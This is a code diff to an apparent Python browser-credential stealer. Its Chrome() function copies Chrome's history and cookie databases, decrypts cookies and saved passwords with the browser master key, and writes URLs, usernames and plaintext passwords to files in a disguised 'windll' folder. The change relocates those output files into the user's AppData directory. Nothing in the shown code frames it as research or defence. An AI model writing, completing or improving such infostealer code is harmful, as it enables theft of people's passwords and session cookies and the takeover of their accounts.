@@ -47,6 +47,7 @@ def decrypt(buff, master_key):
 
 def Chrome():
     try:
+        path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
@@ -57,7 +58,7 @@ def Chrome():
         c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
         cursor = c.cursor()
         temp = []
-        with open(rf"C:\windll\Browsers\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
+        with open(rf"{path}\windll\Browsers\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
             for result in cursor.execute(HistorySQL).fetchall():
                 data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                 result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
@@ -77,6 +78,7 @@ def Chrome():
         files = os.listdir(data_path)
         history_db = os.path.join(data_path, 'Cookies')
         shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
+        #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
         c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
         cursor = c.cursor()
         
@@ -107,7 +109,7 @@ def Chrome():
     },
             '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))
 
-        with open(rf"C:\windll\Browsers\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
+        with open(rf"{path}\windll\Browsers\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
             results = results.replace('True', 'true')
             results = results.replace('False', 'false')
             results += '\n]'
@@ -176,7 +178,7 @@ def Chrome():
 
             alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
 
-            with open(r'C:\windll\Browsers\Chrome\chrome-passwords.txt', "a") as o:
+            with open(rf'{path}\windll\Browsers\Chrome\chrome-passwords.txt', "a") as o:
                 o.write(alldatapass)
         try:
 
